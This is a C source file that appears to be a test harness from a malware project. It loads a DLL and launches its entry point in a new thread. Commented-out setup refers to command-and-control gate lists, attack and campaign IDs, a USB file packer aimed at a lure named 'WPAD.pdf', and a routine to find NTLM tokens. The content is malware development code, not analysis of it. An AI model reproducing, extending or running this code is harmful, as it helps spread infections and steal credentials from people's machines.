#include "../CORE32/main.h"
#include "../CORE32/shared.h"

INT main()
{
	ERROR_CODE			status;
	HMODULE				library;
	LPVOID				file_buffer;
	UINT				file_size;
	HMODULE				ntdll;

	void				(*entry_point);



/*
	ntdll		= GetModuleHandleA("ntdll.dll");
	f_itoa		= (char (*)(int, char *, int))GetProcAddress(ntdll, "_itoa");
	f_snprintf	= (int (*)(char *, SIZE_T, const char *, ...))GetProcAddress(ntdll, "_snprintf");
	//f_system	= (int (*)(const char *))GetProcAddress(ntdll, "system");
	f_atoi		= (int (*)(const char *))GetProcAddress(ntdll, "atoi");
	f_strncmp	= (int (*)(const char *, const char *, SIZE_T))GetProcAddress(ntdll, "strncmp");
	f_memcpy	= (void (*)(void *, const void *, SIZE_T))GetProcAddress(ntdll, "memcpy");

	//resolve_local_api32();
	ZeroMemory(&global_config, sizeof(global_config));
	global_config.wrapper_probability	= 100;
	global_config.gate_list_string		= GATE_LIST_TEST;
	global_config.gate_list_size		= string_length(GATE_LIST_TEST);
	//global_config.webdav_list_string	= WEBDAV_LIST_TEST;
	//global_config.webdav_list_size		= string_length(WEBDAV_LIST_TEST);
	global_config.attack_id				= 666;
	global_config.campaign_id			= 777;
	usb_file_packer(	"C:\\Documents and Settings\\user\\Desktop\\WPAD.pdf",
						FALSE,
						FALSE,
						FALSE,
						FALSE,
						FALSE,
						NULL,
						NULL,
						NULL,
						GetModuleHandle(NULL));
						*/

	//find_ntlm_tokens(NULL);
	status		= read_raw_into_buffer(DLL_LOADER_TARGET, &file_size, &file_buffer);

	library		= LoadLibraryA(DLL_LOADER_TARGET);
	entry_point	= (void (*))GetProcAddress(library, DLL_MAIN_ENTRY_POINT);

	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entry_point, file_buffer, 0, NULL);

	Sleep(INFINITE);
}




